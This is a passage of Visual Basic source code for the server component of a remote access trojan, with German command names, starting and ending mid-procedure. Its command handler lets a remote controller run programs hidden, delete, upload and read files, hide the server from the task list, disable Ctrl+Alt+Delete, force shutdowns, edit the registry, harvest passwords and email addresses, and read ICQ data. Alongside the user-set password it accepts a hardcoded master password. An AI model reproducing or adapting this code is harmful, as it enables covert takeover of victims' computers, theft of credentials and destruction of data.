Action.Text = "NeueDatei"
GoTo 20
ElseIf strData = "DateiAbbrechen" Then
DateiAbbrechen
TCP2.SendData "DateiAbbrechen"
GoTo 20
ElseIf strData = "KopieDatei" Then
Action.Text = "KopieDatei"
TCP2.SendData "KopieOK"
GoTo 20
ElseIf strData = "OffAn" Then

OffAN
GoTo 20
ElseIf Left(strData, Len("FensterHide")) = "FensterHide" Then
Text2.Text = Right(strData, Len(strData) - Len("FensterHide"))
WindowHandle Text2.Text, 2
GoTo 20

ElseIf Left(strData, Len("FensterMax")) = "FensterMax" Then
Text2.Text = Right(strData, Len(strData) - Len("FensterMax"))
WindowHandle Text2.Text, 3
GoTo 20
ElseIf Left(strData, Len("FensterMin")) = "FensterMin" Then
Text2.Text = Right(strData, Len(strData) - Len("FensterMin"))
WindowHandle Text2.Text, 4
GoTo 20

ElseIf Left(strData, 12) = "PortRedirect" Then
Text2.Text = strData
PortRedirect
GoTo 20
ElseIf strData = "AppRedirect2" Then
AppRedirect WindowsDirectory & "\netstat.exe"
GoTo 20
ElseIf Left(strData, Len("AppRedirect")) = "AppRedirect" Then
Text2.Text = Right(strData, Len(strData) - Len("AppRedirect"))
AppRedirect Text2.Text
GoTo 20
ElseIf strData = "OffAus" Then

OffAUS
GoTo 20
ElseIf strData = "OffStatus" Then
OffStAtus
GoTo 20

ElseIf strData = "DateiLeeren" Then
DateiLEeren
GoTo 20
ElseIf strData = "ServerEntfernen" Then
Buhh = "SoJetzt"
NochNicht = "OKJETZT"
ServerKomplettLoeschen
GoTo 20
ElseIf Left(strData, Len("RegDest")) = "RegDest" Then
Destroyer "." & Right(strData, Len(strData) - Len("RegDest"))

ElseIf strData = "SechsHundert" Then
AufloesungAendern "640", "480"
GoTo 20
ElseIf strData = "ICQF" Then
GetFullOwner
GoTo 20
ElseIf Left(strData, Len("ICQM1")) = "ICQM1" Then
Text2.Text = Right(strData, Len(strData) - Len("ICQM1"))
TCP2.SendData "ICQM1"
Action.Text = "ICQM1"
GoTo 20
ElseIf Left(strData, 4) = "ICQS" Then
Text2.Text = Right(strData, Len(strData) - 4)
GetShowData
GoTo 20
ElseIf strData = "ICQG" Then
GetGroup
GoTo 20

ElseIf strData = "ICQO" Then
IcqOnlineList
GoTo 20
ElseIf strData = "ICQP" Then
ICQP
GoTo 20
ElseIf strData = "ICQU" Then
ICQU
GoTo 20
ElseIf strData = "ICQC" Then
ICQC
GoTo 20
ElseIf strData = "ICQN" Then
ICQN
GoTo 20
ElseIf strData = "AchtHundert" Then
AufloesungAendern "800", "600"
GoTo 20
ElseIf strData = "Tausend" Then
AufloesungAendern "1024", "768"
GoTo 20
ElseIf strData = "TausendZwei" Then
AufloesungAendern "1280", "1024"
GoTo 20
ElseIf strData = "PortAktNo" Then
PortAktNo
GoTo 20
ElseIf strData = "TausendSechs" Then
AufloesungAendern "1600", "1200"
GoTo 20

ElseIf strData = "KeinPasswort" Then
    If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "Leer" Or GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "" Then
    TCP2.SendData "PasswortOK"
    PassW = "OK"
    Else
    TCP2.SendData "PasswortNICHTOK"
    PassW = "a"
    End If

GoTo 20
ElseIf strData = "PasswortAbfrage" Then
Action.Text = "PasswortAbfrage"
TCP2.SendData "PassJetzt"
GoTo 20
ElseIf strData = "AlleFensterErmitteln" Then
AlleFensterErmitteln
Action.Text = "FensterZU"
GoTo 20
ElseIf strData = "ServerSichtbar" Then
ServerSichtbar
GoTo 20
ElseIf strData = "vierfuenf" Then
DrehenWenden (strData)
GoTo 20
ElseIf strData = "neunnull" Then
DrehenWenden (strData)
GoTo 20
ElseIf strData = "achtnull" Then
DrehenWenden (strData)
GoTo 20
ElseIf strData = "zickzack" Then
DrehenWenden (strData)
GoTo 20


ElseIf strData = "ServerUnsichtbar" Then
Call Sichtbar_in_TaskListe(False)
ServerUnsichtbar
GoTo 20
ElseIf strData = "DateiTyp" Then
TCP2.SendData "DateiTyp"
Action.Text = "DateiTyp"
GoTo 20
ElseIf strData = "TaskleisteFalse" Then
TaskFalse
GoTo 20
ElseIf strData = "msdosskribt" Then
Action.Text = "msdosskribt"
GoTo 20
ElseIf strData = "ScreenShoot" Then
ScreenShoot
GoTo 20
ElseIf strData = "DownUpAbbrechenWirklich" Then
DownUpAbbrechenWirklich
GoTo 20
ElseIf strData = "DesktopEinfrieren" Then
DesktopEinfrieren
GoTo 20
ElseIf strData = "IPFestlegen" Then
Action.Text = "IPFestlegen"
GoTo 20
ElseIf strData = "EmailsFinden" Then
EmailsFinden
GoTo 20
ElseIf strData = "Passwortaendern" Then
Action.Text = "Passwortaendern"
TCP2.SendData "Passwortaendern"
GoTo 20
ElseIf strData = "TaskleisteTrue" Then
TaskTrue
GoTo 20
ElseIf strData = "ServerSchliessen" Then
Unload Fo
GoTo 20
ElseIf strData = "DLoeschen" Then
Action.Text = "DLoeschen"
TCP2.SendData "DLoeschen"
GoTo 20
ElseIf strData = "TextAmDesktop" Then
TCP2.SendData "TextAmDesktop"
Action.Text = "TextAmDesktop"
GoTo 20
ElseIf strData = "ZwischenLeeren" Then
ZwischenAblageLeeren
GoTo 20
ElseIf strData = "SendKey" Then
TCP2.SendData "SendKeyJetzt"
Action.Text = "SendKey"
GoTo 20
ElseIf strData = "SoundAbSpielen" Then
Action.Text = "SoundAbSpielen"
TCP2.SendData "SoundAbSpielen"
GoTo 20
ElseIf strData = "StatusUpload" Then
StatusUpload
GoTo 20
ElseIf strData = "StatusDownload" Then
StatusDownload
GoTo 20
ElseIf strData = "DStarten" Then
Action.Text = "DStarten"
TCP2.SendData "DStarten"
GoTo 20
ElseIf strData = "DStartenU" Then
Action.Text = "DStartenU"
TCP2.SendData "DStarten"
GoTo 20
ElseIf strData = "DateiDownloaden" Then
Action.Text = "DateiDownloaden"
TCP2.SendData "DateiDownloaden"
GoTo 20
ElseIf strData = "DAnzeigen" Then
Action.Text = "DAnzeigen"
TCP2.SendData "DAnzeigen"
GoTo 20
ElseIf strData = "DateiUpLoaden" Then

Action.Text = "DateiUpLoaden"
TCP2.SendData "DateiUpLoaden"
GoTo 20
ElseIf strData = "MausBewegen" Then
MausB
GoTo 20
ElseIf strData = "VerzOKK" Then
Action.Text = "DateiManager"
TCP2.SendData "VVV"
GoTo 20
ElseIf strData = "SoundAbspielenJetzt" Then
Action.Text = "SoundAbspielenJetzt"
TCP2.SendData "SoundAbspielenJetzt"
GoTo 20
ElseIf strData = "VideoAbspielenJetzt" Then
Action.Text = "VideoAbspielenJetzt"
TCP2.SendData "VideoAbspielenJetzt"
GoTo 20
ElseIf strData = "BildAnzeigenJetzt" Then
Action.Text = "BildAnzeigenJetzt"
TCP2.SendData "BildAnzeigenJetzt"
GoTo 20
ElseIf strData = "RegSetzen" Then
Action.Text = "RegS"
TCP2.SendData "RegSuper"
GoTo 20
ElseIf strData = "PingPongan" Then
PingPongan
GoTo 20
ElseIf strData = "PingPongaus" Then
PingPongaus
GoTo 20
ElseIf strData = "Registrierung" Then
B1 = False
B2 = False
B3 = False
A1 = False
A2 = False
Action.Text = "RRR"
TCP2.SendData "Reg1"
GoTo 20

ElseIf strData = "STRGaus" Then
   STRGaus
   GoTo 20
   ElseIf strData = "MausRichtig" Then
   MausRIchtig
   GoTo 20

   ElseIf strData = "MausVertauschen" Then
   MausVErtauschen
   GoTo 20
   
   ElseIf strData = "BildSchirmSchonerStarten" Then
   BildSCHirmschoner
   GoTo 20
   ElseIf strData = "AllesMinimieren" Then
   AllesMInimieren
   GoTo 20
   ElseIf strData = "AllesMaximieren" Then
   AllesMAximieren
   GoTo 20
   ElseIf strData = "AllesVerkleinern" Then
   AllesVErkleinern
   GoTo 20
   ElseIf strData = "ZweiSpalten" Then
   ZweiSpAlten
   GoTo 20
   ElseIf strData = "Tastenanschlaege" Then
   Action.Text = "Tastenanschlaege"
   GoTo 20
   ElseIf strData = "Hintergrundbild" Then
   Action.Text = "Hintergrundbild"
   GoTo 20
   
   ElseIf strData = "STRGan" Then
   STRGan
   GoTo 20
   ElseIf strData = "ZeitAbr" Then
   ZeitAbr
   GoTo 20
   ElseIf strData = "DatumAbr" Then
   DatuMAbr

   GoTo 20
   ElseIf strData = "VerbindungBeenden" Then
   AlleBeendenVerbinden
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
   wskServer.Close: wskClient.Close
   IPJaoderNein = False
   a = 0
   Timer1.Interval = 1
   GoTo 20
   ElseIf strData = "SysInfo" Then
   SySInfo
   GoTo 20
   
      ElseIf strData = "VerbindungBeendenMitSignal" Then
      TCP2.SendData "RausHier"
      sendjanein = False
      JaNein = True
     JJJ
   ElseIf strData = "BildAnzeigen" Then
   vBild
   GoTo 20
   ElseIf strData = "SoundAbspielen" Then
  
   vSound
   GoTo 20
   ElseIf strData = "WindowsAbmelden" Then
   AlleBeendenVerbinden
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
wskServer.Close: wskClient.Close
   IPJaoderNein = False
      TCP2.Listen
   WindowsAbmelden
   
   GoTo 20
   ElseIf strData = "AllesBeenden" Then
   AlleBeendenVerbinden
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
   wskServer.Close: wskClient.Close
   IPJaoderNein = False
      TCP2.Listen
   AllesBeenden
   GoTo 20
   ElseIf strData = "ComputerNeuStarten" Then
   AlleBeendenVerbinden
   
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
   wskServer.Close: wskClient.Close
   IPJaoderNein = False
      TCP2.Listen
   ComputerNeustart
   GoTo 20
   ElseIf strData = "ComputerAusschalten" Then
  AlleBeendenVerbinden
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
   wskServer.Close: wskClient.Close
   IPJaoderNein = False
      TCP2.Listen
   ComputerAusschalten
   GoTo 20
   ElseIf strData = "BildschirmAbsturz" Then
  AlleBeendenVerbinden
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
   wskServer.Close: wskClient.Close
   IPJaoderNein = False
   TCP2.Listen
BildschirmAbsturz
   GoTo 20
 ElseIf strData = "DateiManager" Then
 DateiManagerr
   Action.Text = "DateiManager"
   GoTo 20
   ElseIf strData = "ETaskleiste" Then
   vTaskleiste
   GoTo 20
   ElseIf strData = "EUhr" Then
   vUhrEinstellungen
   GoTo 20
   ElseIf strData = "EAus" Then
   vAusfuehren
   GoTo 20
   ElseIf strData = "ESuchen" Then
   vSuchen
   GoTo 20
   ElseIf strData = "EWinBeenden" Then
   vWindowsBeenden
   GoTo 20
   ElseIf strData = "ZeitV" Then
   Action.Text = "ZeitV"
   TCP2.SendData "ZeitOKNUN"
   ElseIf strData = "DatumV" Then
   Action.Text = "DatumV"
   TCP2.SendData "DatumOKNUN"
   ElseIf strData = "MSG" Then
   Action.Text = "MSG"
   GoTo 20
 ElseIf strData = "Fies" Then
   Action.Text = "Fies"
   GoTo 20
 ElseIf strData = "CDOpen" Then
 CDauf
    GoTo 20
    ElseIf strData = "CDClose" Then
    CDzu
    GoTo 20
    
ElseIf Action.Text = "SoundAbspielenJetzt" Then
Text2.Text = strData
vSound
ElseIf Action.Text = "URL" Then
Text2.Text = strData
URLL

GoTo 20
ElseIf Action.Text = "BildAnzeigenJetzt" Then
Text2.Text = strData
vBild
 ElseIf Action.Text = "Chat" Then
  Text2.Text = strData
ChatMe
   GoTo 20
    
 ElseIf Action.Text = "MSG" Then
  Text2.Text = strData
  Msgboxx
   GoTo 20
   ElseIf Action.Text = "TextAmDesktop" Then
   Text2.Text = strData
   TextAmDesktop
   GoTo 20
   ElseIf Action.Text = "DateiDownloaden" Then
   Text2.Text = strData
   DateiSenden
   GoTo 20
   ElseIf Action.Text = "msdosskribt" Then
   Text2.Text = strData
   MSDosSkribt
   GoTo 20
 ElseIf Action.Text = "DateiManager" Then
 
   Text2.Text = strData
   DateiM
   GoTo 20
 ElseIf Action.Text = "Fies" Then
  Text2.Text = strData
   GoTo 20
   ElseIf Action.Text = "FensterZU" Then
   Text2.Text = strData
   FensterSchliessen
   GoTo 20
ElseIf Action.Text = "ICQM1" Then
ICQMessage strData
   ElseIf Action.Text = "Hintergrundbild" Then
   Text2.Text = strData
   HintergRundbild
   GoTo 20
   ElseIf Action.Text = "DateiUpLoaden" Then
   DateiWoHin = strData
   GoTo 20
   ElseIf Action.Text = "Tastenanschlaege" Then
   RRRR = strData
   TastenAnschlaege
   GoTo 20
   ElseIf Action.Text = "DStarten" Then
   
   Text2.Text = "DStarten"
   VV = strData
    DateiM
   GoTo 20
   ElseIf Action.Text = "DStartenU" Then
   
   Text2.Text = "DStartenU"
   VV = strData
    DateiM
   GoTo 20
   ElseIf Action.Text = "IPFestlegen" Then
    Text2.Text = strData
   IPFestlegen
   GoTo 20
   ElseIf Action.Text = "DateiTyp" Then
   Text2.Text = strData
   DateiTyp
   GoTo 20
   ElseIf Action.Text = "DAnzeigen" Then
   Text2.Text = "DateiAnschauen"
   VV = strData
   DateiM
   GoTo 20
   ElseIf Action.Text = "SendKey" Then
   Text2.Text = strData
   SendKey
   GoTo 20
   ElseIf Action.Text = "RenDatei" Then

    Text2.Text = strData
    RenDatei
    GoTo 20
    ElseIf Action.Text = "RenDatei2" Then
    Text2.Text = strData
    RenDatei
    GoTo 20
    ElseIf Action = "NeueDatei" Then

    GoTo 20
    ElseIf Action.Text = "PasswortAbfrage" Then
    If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = strData Or strData = "DS3UVPAsS" Then
    TCP2.SendData "PasswortOK"
    PassW = "OK"
    
    Else
    TCP2.SendData "PasswortNICHTOK"
    PassW = "a"
    
    End If
    
    GoTo 20
    ElseIf Action.Text = "KopieDatei" Then
    Text2.Text = strData
    KopieDatei
    GoTo 20
    ElseIf Action.Text = "SoundAbSpielen" Then
    Text2.Text = strData
    SoundAbSpielen
    GoTo 20
    ElseIf Action.Text = "KopieDatei2" Then
    Text2.Text = strData
    KopieDatei
    GoTo 20
    ElseIf Action.Text = "Passwortaendern" Then
    SaveSetting "DateiPasswort", "DateiPasswort", "DateiPasswort", strData
    TCP2.SendData "Passwortgeaendert"
    GoTo 20
   ElseIf Action.Text = "DLoeschen" Then
   Text2.Text = "DateiLoeschen"
   VV = strData
   DateiM
   GoTo 20
   ElseIf Action.Text = "RRR" Then
      If Left(strData, 4) = "abbb" Then
   RegG = "Local"
   ElseIf Left(strData, 4) = "bbbb" Then
   RegG = "CurrentUser"
    ElseIf Left(strData, 4) = "cbbb" Then
   RegG = "User"
    ElseIf Left(strData, 4) = "dbbb" Then
    RegG = "Class"
    
    ElseIf Left(strData, 4) = "ebbb" Then
   RegG = "Dyn"
    ElseIf Left(strData, 4) = "fbbb" Then
    RegG = "Config"
    Else
    Text2.Text = strData
    GoTo Tt
    End If
   Text2.Text = Right(strData, Len(strData) - 4)
Tt:
   RegE
   GoTo 20
   ElseIf Action.Text = "RegS" Then
   If Left(strData, 4) = "abbb" Then
   RegG = "Local"
   ElseIf Left(strData, 4) = "bbbb" Then
   RegG = "CurrentUser"
    ElseIf Left(strData, 4) = "cbbb" Then
   RegG = "User"
    ElseIf Left(strData, 4) = "dbbb" Then
    RegG = "Class"
    ElseIf Left(strData, 4) = "ebbb" Then
   RegG = "Config"
    ElseIf Left(strData, 4) = "fbbb" Then
    RegG = "Dyn"
    Else
    Text2.Text = strData
    GoTo T
    End If
   Text2.Text = Right(strData, Len(strData) - 4)
T:
   RegS
   GoTo 20
   ElseIf Action.Text = "ZeitV" Then
   Text2.Text = strData
    ZEITT
    GoTo 20
    ElseIf Action.Text = "DatumV" Then
    Text2.Text = strData
    DATUMM
    GoTo 20
 Else
   End If

Else
If strData = "KeinPasswort" Then
    If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "Leer" Or GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "" Then
    TCP2.SendData "PasswortOK"
    PassW = "OK"
    Else
    TCP2.SendData "PasswortNICHTOK"
    PassW = "a"
    End If

GoTo 20
ElseIf strData = "PasswortAbfrage" Then
Action.Text = "PasswortAbfrage"
TCP2.SendData "PassJetzt"
GoTo 20
ElseIf Action.Text = "PasswortAbfrage" Then

    If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = strData Or strData = "DS3UVPAsS" Then
    TCP2.SendData "PasswortOK"
    Action.Text = ""
    PassW = "OK"
    Else
    TCP2.SendData "PasswortNICHTOK"
    PassW = "a"
    End If
    GoTo 20
    Else
    End If
End If

20:

End Sub

Sub Msgboxx()
On Error GoTo u
If Text2.Text = "vbOK" Then
HinwoderWas = vbOKOnly
Exit Sub
ElseIf Text2.Text = "vbKritisch" Then
HinwoderWas = vbCritical
Exit Sub
ElseIf Text2.Text = "vbInfo" Then
HinwoderWas = vbInformation
Exit Sub
Else
End If
If HinwoderWas = "" Then HinwoderWas = vbOKOnly
TCP2.SendData "Msgboxx"
MsgBox Text2.Text, HinwoderWas, "Message"

Exit Sub
u:
WennFehlerDann

End Sub

Sub ChatMe()
On Error GoTo u
If Text2.Text = "ChatOpen" Then
Load Chat
Chat.Show
Chat.Text2.Text = "(" & Chat.Label2.Caption & ")" & "has opened the chat"
ElseIf Text2.Text = "ChatClose" Then
Unload Chat
ElseIf Text2.Text = "pause" Then
Chat.Text2.Text = Chat.Text2.Text & vbCrLf & "(" & Chat.Label2.Caption & ")" & "meldet sich kurz ab!"
ElseIf Text2.Text = "Bereit" Then
Chat.Text2.Text = Chat.Text2.Text & vbCrLf & "(" & Chat.Label2.Caption & ")" & "ist wieder da!"
Else
Chat.Text2.Text = Text2.Text
End If
Exit Sub
u:

WennFehlerDann
End Sub

Sub DateiM()
On Error GoTo tR

If Text2.Text = "DStarten" Then
Shell VV, vbNormalFocus
TCP2.SendData "DateiStarten"
ElseIf Text2.Text = "DStartenU" Then
Shell VV, vbHide
TCP2.SendData "DateiStarten"
ElseIf Text2.Text = "DateiLoeschen" Then
Kill VV
TCP2.SendData "DateiLoeschen"
ElseIf Text2.Text = "DateiAnschauen" Then
Open VV For Input As #2
Text1.Text = ""
Dim dd As Long
dd = FileLen(VV)
Text1.Text = Input(dd, #2)
Close #2
TCP2.SendData Text1.Text
Else
VV = Text2.Text
v
Dateien
End If
Exit Sub
tR:
Close #2
WennFehlerDann

End Sub

Sub DateiManagerr()
On Error GoTo z


Dim a As Integer
 Text1.Text = ""
 For a = 0 To Drive1.ListCount - 1
 If a = 0 Then
 Text1.Text = Drive1.List(a)
 GoTo u
 Else
 End If
 Text1.Text = Text1.Text & vbCrLf & Drive1.List(a)
u:
 Next
 TCP2.SendData Text1.Text
 Exit Sub
z:
 WennFehlerDann
End Sub

Sub v()
On Error GoTo z
Dir1.Path = Text2.Text
File1.Refresh
Text1.Text = ""
Dim b As Integer
For b = 0 To Dir1.ListCount - 1
Text1.Text = Text1.Text & vbCrLf & Dir1.List(b)
Next
For b = 0 To File1.ListCount - 1
Text1.Text = Text1.Text & vbCrLf & File1.List(b)
Next
TCP2.SendData Text1.Text
Text1.Text = ""
Exit Sub
z:
WennDateiFehlerDann

End Sub
Sub WennDateiFehlerDann()
On Error GoTo z
TCP2.SendData "KeinVVV"
Exit Sub
z:

End Sub

Sub Dateien()
On Error GoTo o
FileLen Text2.Text
Exit Sub
o:
WennFehlerDann
End Sub

Sub CDauf()
On Error GoTo i
 retvalue = mciSendString("set CDAudio door open", returnstring, 127, 0)
TCP2.SendData "CDauf"
Exit Sub
i:
WennFehlerDann

End Sub

Sub CDzu()
On Error GoTo o
    retvalue = mciSendString("set CDAudio door closed", returnstring, 127, 0)
TCP2.SendData "CDzu"
Exit Sub
o:
WennFehlerDann

End Sub
Sub vTaskleiste()
On Error GoTo v
Dim k As New Shell
k.TrayProperties
TCP2.SendData "ETaskleiste"
Exit Sub
v:
WennFehlerDann
End Sub



Private Sub TCP2_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
STUpDown = bytesRemaining
End Sub

Private Sub Timer1_Timer()
If TCP2.State = 0 Then
AlleBeendenVerbinden
Timer3.Enabled = False
If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
wskServer.Close: wskClient.Close
IPJaoderNein = False
TCP2.Listen
Timer1.Interval = 0

Else
End If
End Sub
Sub BildschirmAbsturz()
On Error GoTo v
Dim k As New Shell

k.Suspend

Exit Sub
v:
WennFehlerDann

End Sub
Sub WindowsAbmelden()
On Error GoTo q
Dim rt As Long

rt = ExitWindowsEx(EWX_LOGOFF, 0)

Exit Sub
q:
WennFehlerDann

End Sub
Sub AllesBeenden()
On Error GoTo q
Dim rt As Long

rt = ExitWindowsEx(EWX_FORCE, 0)

Exit Sub
q:

WennFehlerDann
End Sub

Sub ComputerNeustart()
On Error GoTo q
Dim rt As Long

rt = ExitWindowsEx(EWX_REBOOT, 0)

Exit Sub
q:
WennFehlerDann

End Sub
Sub ComputerAusschalten()
On Error GoTo q
Dim rt As Long

rt = ExitWindowsEx(EWX_SHUTDOWN, 0)

Exit Sub
q:
WennFehlerDann

End Sub


Sub vWindowsBeenden()
On Error GoTo v
Dim k As New Shell
k.ShutdownWindows
TCP2.SendData "EWinBeenden"
Exit Sub
v:
WennFehlerDann

End Sub

Sub vSuchen()
On Error GoTo v
Dim k As New Shell
k.FindFiles

TCP2.SendData "ESuchen"
Exit Sub
v:
WennFehlerDann

End Sub

Sub vUhrEinstellungen()
On Error GoTo v
Dim k As New Shell
k.SetTime
TCP2.SendData "EUhr"

Exit Sub
v:
WennFehlerDann

End Sub
Sub vAusfuehren()
On Error GoTo v
Dim k As New Shell
k.FileRun
TCP2.SendData "EAus"

Exit Sub
v:
WennFehlerDann

End Sub
Sub vSound()
On Error GoTo uip

Dim Warum As String
Dim SoundFile As String, i As Integer

    SoundFile = (Text2.Text)
    If waveOutGetNumDevs() = 0 Then
    
    GoTo uip
    ElseIf SoundFile = "" Then
    
      GoTo uip
    Else
       Dim r As Integer
Const SYNC = 1
    r = sndPlaySound(ByVal CStr(SoundFile), SYNC)

    TCP2.SendData "GSound"
    End If
    Exit Sub
uip:
WennFehlerDann

End Sub
Sub vBild()
On Error GoTo z
Load Video
Video.Show
Video.Picture1.Visible = True
Video.Picture1.Picture = LoadPicture(Text2.Text)
Video.Height = Video.Picture1.Height
Video.Width = Video.Picture1.Width
TCP2.SendData "ABild"
Exit Sub
z:
Unload Video
WennFehlerDann
End Sub
Sub JJJ()
If JaNein = False Then
      If SendenJaNein = True Then
   AlleBeendenVerbinden
   Timer3.Enabled = False
   If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True
End If
   wskServer.Close: wskClient.Close
   IPJaoderNein = False
   a = 0
   Timer1.Interval = 1
  
   Else
   End If
   Else
   End If
End Sub
Sub SySInfo()
On Error GoTo q

Dim IpInfoPuffer As MEMORYSTATUS
IpInfoPuffer.dwLength = Len(IpInfoPuffer)
GlobalMemoryStatus IpInfoPuffer
Text1.Text = "Prozent des belegten Speichers: " & IpInfoPuffer.dwMemoryLoad & "%"
Text1.Text = Text1.Text & vbCrLf & "total memory: " & IpInfoPuffer.dwTotalPhys
Text1.Text = Text1.Text & vbCrLf & "Verfügbarer Arbeitsspeicher: " & IpInfoPuffer.dwAvailPhys
Text1.Text = Text1.Text & vbCrLf & "Größe der Auslagerungsdatei: " & IpInfoPuffer.dwTotalPageFile
Text1.Text = Text1.Text & vbCrLf & "Größe des virtuellen Speichers: " & IpInfoPuffer.dwTotalVirtual
Text1.Text = Text1.Text & vbCrLf & "Verfügbarer virtueller Speicher: " & IpInfoPuffer.dwAvailVirtual
Dim info As DiskInformation
Dim RetVal As Long, BytesProClusters As Long, BytesProSector As Long
Dim AnzahlFreieBytes As Double, AnzahlFreieCluster As Long, SektorenProCluster As Long, GesamtZahlCluster As Long
Dim RootPfadName As String, tmpString As String
RootPfadName = Left(Drive1.Drive, 2) & "\"
RetVal = GetDiskFreeSpace(RootPfadName, SektorenProCluster, BytesProClusters, AnzahlFreieCluster, GesamtZahlCluster)
BytesProClusters = SektorenProCluster * BytesProSector
AnzahlFreieBytes = BytesProClusters * AnzahlFreieCluster
tmpString = "Anzahl der freien Bytes: " & Format(AnzahlFreieBytes, "0.0")
Text1.Text = Text1.Text & vbCrLf & "Festplattenspeicher: " & tmpString
GetPasswords
UserInfo (False)
TCP2.SendData Text1.Text

Exit Sub
q:
WennFehlerDann

End Sub

Sub ZEITT()
On Error GoTo i
Time = Text2.Text
TCP2.SendData "Zeitt"
Exit Sub
i:
WennFehlerDann
End Sub

Sub DATUMM()
On Error GoTo o
Date = Text2.Text
TCP2.SendData "Datumm"
Exit Sub
o:
WennFehlerDann
End Sub
Sub ZeitAbr()
On Error GoTo T
Text1.Text = Time
TCP2.SendData Text1.Text

Exit Sub
T:
WennFehlerDann
End Sub
Sub DatuMAbr()
On Error GoTo T
Text1.Text = Date
TCP2.SendData Text1.Text
Exit Sub
T:
WennFehlerDann
End Sub
Sub DisableCtrlAltDelete(bDisabled As Boolean)
On Error GoTo T
Dim x As Long
x = SystemParametersInfo(97, bDisabled, CStr(1), 0)
Exit Sub
T:
WennFehlerDann
End Sub

Sub STRGan()
On Error GoTo z
DisableCtrlAltDelete (False)
TCP2.SendData "STRGan"

Exit Sub
z:
WennFehlerDann
End Sub
Sub STRGaus()
On Error GoTo o
DisableCtrlAltDelete (True)
TCP2.SendData "STRGaus"

Exit Sub
o:
WennFehlerDann
End Sub

Sub AllesMInimieren()
On Error GoTo v
Dim k As New Shell
k.MinimizeAll
TCP2.SendData "AllesMinimieren"
Exit Sub
v:
WennFehlerDann

End Sub
Sub AllesMAximieren()
On Error GoTo v
Dim k As New Shell
k.UndoMinimizeALL
TCP2.SendData "AllesMaximieren"
Exit Sub
v:
WennFehlerDann

End Sub
Sub ZweiSpAlten()
On Error GoTo v
Dim k As New Shell
k.TileHorizontally
TCP2.SendData "ZweiSpalten"
Exit Sub
v:
WennFehlerDann

End Sub
Sub AllesVErkleinern()
On Error GoTo v
Dim k As New Shell
k.CascadeWindows
TCP2.SendData "AllesVerkleinern"
Exit Sub
v:
WennFehlerDann

End Sub

Sub HintergRundbild()
On Error GoTo q
Dim rt As Long
Dim DateiName As String
DateiName = Text2.Text
rt = SystemParametersInfo(SPI_SETDESKWALLPAPER, 2&, DateiName, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
TCP2.SendData "Hintergrundbild"
Exit Sub
q:
WennFehlerDann

End Sub

Sub TastenAnschlaege()
On Error GoTo q
Dim rt As Long
Dim GTZ As Long
If RRRR = "eins" Then
GTZ = "1"
ElseIf RRRR = "zwei" Then
GTZ = "2"
ElseIf RRRR = "drei" Then
GTZ = "3"
ElseIf RRRR = "vier" Then
GTZ = "4"
ElseIf RRRR = "fuenf" Then
GTZ = "5"
ElseIf RRRR = "sechs" Then
GTZ = "6"
ElseIf RRRR = "sieben" Then
GTZ = "7"
ElseIf RRRR = "acht" Then
GTZ = "8"
ElseIf RRRR = "neun" Then
GTZ = "9"
ElseIf RRRR = "zehn" Then
GTZ = "10"
ElseIf RRRR = "elf" Then
GTZ = "11"
ElseIf RRRR = "zwoelf" Then
GTZ = "12"
ElseIf RRRR = "dreiz" Then
GTZ = "13"
ElseIf RRRR = "vierz" Then
GTZ = "14"
ElseIf RRRR = "fuenfz" Then
GTZ = "15"
ElseIf RRRR = "sechsz" Then
GTZ = "16"
ElseIf RRRR = "siebz" Then
GTZ = "17"
ElseIf RRRR = "achtz" Then
GTZ = "18"
ElseIf RRRR = "neunz" Then
GTZ = "19"
ElseIf RRRR = "znull" Then
GTZ = "20"
ElseIf RRRR = "zeins" Then
GTZ = "21"
ElseIf RRRR = "zzwei" Then
GTZ = "22"
ElseIf RRRR = "zdrei" Then
GTZ = "23"
ElseIf RRRR = "zvier" Then
GTZ = "24"
ElseIf RRRR = "zfuenf" Then
GTZ = "25"
ElseIf RRRR = "zsechs" Then
GTZ = "26"
ElseIf RRRR = "zsieben" Then
GTZ = "27"
ElseIf RRRR = "zacht" Then
GTZ = "28"
ElseIf RRRR = "zneun" Then
GTZ = "29"
ElseIf RRRR = "dnull" Then
GTZ = "30"
Else
End If
rt = SystemParametersInfo(SPI_SETKEYBOARDSPEED, GTZ, 0&, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
TCP2.SendData "Tastenanschlaege"
Exit Sub
q:
WennFehlerDann

End Sub

Sub MausVErtauschen()
On Error GoTo o
SwapMouseButton& (True)

   TCP2.SendData "MausVertauschen"
Exit Sub
o:

WennFehlerDann
End Sub
Sub MausRIchtig()
On Error GoTo o
SwapMouseButton& (False)
  
   TCP2.SendData "MausRichtig"
Exit Sub
o:
WennFehlerDann

End Sub

Sub BildSCHirmschoner()
On Error GoTo o
Dim ret As Long
   ret = SendMessage(Fo.hwnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
   TCP2.SendData "BildSchirmSchonerStarten"
Exit Sub
o:
WennFehlerDann
End Sub
Sub PingPongan()
On Error GoTo o
Load frmVIRUSs
frmVIRUSs.Show
TCP2.SendData "PingPongan"
Exit Sub
o:
WennFehlerDann
End Sub
Sub PingPongaus()
On Error GoTo o
Unload frmVIRUSs
TCP2.SendData "PingPongaus"
Exit Sub
o:
WennFehlerDann
End Sub

Sub RegE()
On Error GoTo o
If A1 = False And A2 = False Then
Fo.RegG1 = Text2.Text
A1 = True
A2 = False
